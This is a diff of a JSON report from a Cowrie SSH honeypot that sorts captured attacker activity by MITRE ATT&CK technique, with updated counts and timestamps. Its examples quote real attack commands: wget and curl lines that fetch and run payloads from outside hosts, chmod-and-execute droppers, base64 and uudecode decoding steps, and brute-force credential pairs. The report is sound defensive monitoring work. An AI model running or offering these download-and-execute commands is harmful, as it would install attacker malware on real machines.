@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-13 17:02:07",
+  "generated": "2026-08-13 18:00:39",
   "totals": {
-    "commands": 2189,
-    "login_failed": 2617,
-    "login_success": 130,
-    "sessions": 2919
+    "commands": 2364,
+    "login_failed": 2862,
+    "login_success": 140,
+    "sessions": 3044
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2617,
+      "count": 2862,
       "examples": [
         "user1 / 123456",
         "root / 1234567",
@@ -21,14 +21,14 @@
         "user1 / 12345678"
       ],
       "first": "2026-08-13T00:00:04.398982Z",
-      "last": "2026-08-13T17:00:59.553214Z",
-      "unique_ips": 123
+      "last": "2026-08-13T17:59:55.104237Z",
+      "unique_ips": 143
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 443,
+      "count": 507,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -37,14 +37,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-08-13T00:01:53.648846Z",
-      "last": "2026-08-13T16:51:45.256693Z",
-      "unique_ips": 37
+      "last": "2026-08-13T17:29:56.345049Z",
+      "unique_ips": 42
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 179,
+      "count": 203,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -53,14 +53,14 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-13T00:01:55.509663Z",
-      "last": "2026-08-13T16:51:45.256693Z",
-      "unique_ips": 36
+      "last": "2026-08-13T17:29:56.345049Z",
+      "unique_ips": 41
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 130,
+      "count": 140,
       "examples": [
         "root / root",
         "root / 123@@@",
@@ -69,27 +69,27 @@
         "orangepi / orangepi"
       ],
       "first": "2026-08-13T00:01:49.585213Z",
-      "last": "2026-08-13T16:51:05.169012Z",
-      "unique_ips": 84
+      "last": "2026-08-13T17:48:46.714293Z",
+      "unique_ips": 93
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 28,
+      "count": 32,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-13T00:01:55.509663Z",
-      "last": "2026-08-13T16:51:08.588522Z",
-      "unique_ips": 28
+      "last": "2026-08-13T17:29:18.763335Z",
+      "unique_ips": 32
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 21,
+      "count": 23,
       "examples": [
         "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chatt",
         "uname -a",
@@ -98,8 +98,8 @@
         "cat /proc/cpuinfo"
       ],
       "first": "2026-08-13T00:24:55.186109Z",
-      "last": "2026-08-13T16:49:29.168130Z",
-      "unique_ips": 13
+      "last": "2026-08-13T17:48:47.396678Z",
+      "unique_ips": 15
     },
     {
       "id": "T1489",
@@ -167,6 +167,19 @@
       "unique_ips": 1
     },
     {
+      "id": "T1140",
+      "name": "Deobfuscate/Decode Files or Information",
+      "tactic": "Defense Evasion",
+      "count": 4,
+      "examples": [
+        "/bin/busybox echo bFRP | base64 -d; /bin/busybox echo Nkty | openssl base64 -d; /bin/busybox sHcUt4nc",
+        "uudecode <<'~'"
+      ],
+      "first": "2026-08-13T17:14:52.536001Z",
+      "last": "2026-08-13T17:15:37.297453Z",
+      "unique_ips": 1
+    },
+    {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
@@ -223,39 +236,39 @@
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      327
+      359
     ],
     [
       "shell",
-      52
+      58
     ],
     [
       "sh",
-      52
+      58
     ],
     [
       "system",
-      46
+      52
     ],
     [
       "enable",
-      42
+      48
     ],
     [
       "linuxshell",
-      37
+      41
     ],
     [
       "ping ;sh",
-      30
+      34
     ],
     [
       "enablelinuxshell",
-      29
+      33
     ],
     [
       "cd /proc && cat self/cmdline",
-      29
+      33
     ],
     [
       "busybox",
